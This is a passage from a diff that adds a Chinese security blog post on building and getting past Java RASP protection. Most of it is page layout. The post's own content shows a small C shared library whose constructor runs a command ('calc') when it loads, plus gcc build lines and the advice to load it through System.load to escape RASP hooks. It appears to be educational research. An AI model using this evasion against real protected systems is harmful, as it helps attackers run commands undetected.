getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240324145220175.png"
+                      alt="image-20240324145220175"
+                ></p>
+<p>可以发现命令被成功执行，而且执行的命令并没有被拦截。</p>
+<h2 id="JNI-绕过RASP-执行命令"><a href="#JNI-绕过RASP-执行命令" class="headerlink" title="JNI 绕过RASP 执行命令"></a>JNI 绕过RASP 执行命令</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14067160.html#0x02-jni%E5%AE%9E%E7%8E%B0" >https://www.cnblogs.com/nice0e3/p/14067160.html#0x02-jni%E5%AE%9E%E7%8E%B0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>这种方式挺麻烦的，这个装载native方法的类从哪儿上传呢，可能可以写个静态代码块先 loadLibrary ？有空再学吧</p>
+<h2 id="System-load-绕过"><a href="#System-load-绕过" class="headerlink" title="System.load 绕过"></a>System.load 绕过</h2><p>大概就是编译一个c文件为 so（Linux） 或者 dll （Windows）</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="type">void</span> <span class="title">preload</span> <span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -shared -fPIC evil.c -o evil.so</span></span><br><span class="line"><span class="comment">// gcc -shared -fPIC evil.c -o evil.dll</span></span><br></pre></td></tr></table></figure></div>
+
+<p>使用 gcc 进行编译 </p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC evil.c -o evil.dll</span><br><span class="line">或</span><br><span class="line">gcc -shared -fPIC evil.c -o evil.so</span><br></pre></td></tr></table></figure></div>
+
+<p>最后通过 Evil 类去调用 System.load() 方法进行加载即可。</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> java Rasp 的简单实现与绕过</li>
+        <li><strong>作者:</strong> Ko1sh1</li>
+        <li><strong>创建于
+                :</strong> 2024-03-25 10:51:22</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2024-05-30 21:13:33
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://ko1sh1.github.io/2024/03/25/blog_java Rasp的实现与绕过/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/%E6%8A%80%E5%B7%A7/">#技巧</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/03/13/blog_%E4%BB%8EAgent%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">从 agent 到内存马</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div class="twikoo-container">
+        <script data-swup-reload-script
+                src='https://cdn.staticfile.org/twikoo/1.6.31/twikoo.all.min.js'
+        ></script>
+        <div id="twikoo-comment"></div>
+        <script data-swup-reload-script>
+            function loadTwikoo() {
+                twikoo.init({
+                    el: '#twikoo-comment',
+                    envId: 'https://ko1sh1-blog-comments.hf.space',
+                });
+            }
+
+            if ('true') {
+                const loadTwikooTimeout = setTimeout(() => {
+                    loadTwikoo();
+                    clearTimeout(loadTwikooTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadTwikoo);
+            }
+        </script>
+    </div>
+
+
+        
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">java Rasp 的简单实现与绕过</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Rasp-Hook-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2"><span class="nav-text">Rasp Hook 命令执行函数的攻与防</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Runtime"><span class="nav-text">Runtime</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ProcessBuilder"><span class="nav-text">ProcessBuilder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UNIXProcess-ProcessImpl"><span class="nav-text">UNIXProcess&#x2F;ProcessImpl</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E5%8D%95-rasp-%E6%A3%80%E6%B5%8B"><span class="nav-text">简单 rasp 检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-%E7%BB%95%E8%BF%87"><span class="nav-text">Windows 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux-%E7%BB%95%E8%BF%87"><span class="nav-text">Linux 绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#native"><span class="nav-text">native</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#hook-%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="nav-text">hook 原理解析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hook-%E5%B0%9D%E8%AF%95"><span class="nav-text">hook 尝试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-text">绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JNI-%E7%BB%95%E8%BF%87RASP-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">JNI 绕过RASP 执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#System-load-%E7%BB%95%E8%BF%87"><span class="nav-text">System.load 绕过</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ko1sh1</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共 14 篇文章
+                    </span>
+                    
+                        <span>
+                            共 128.2k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
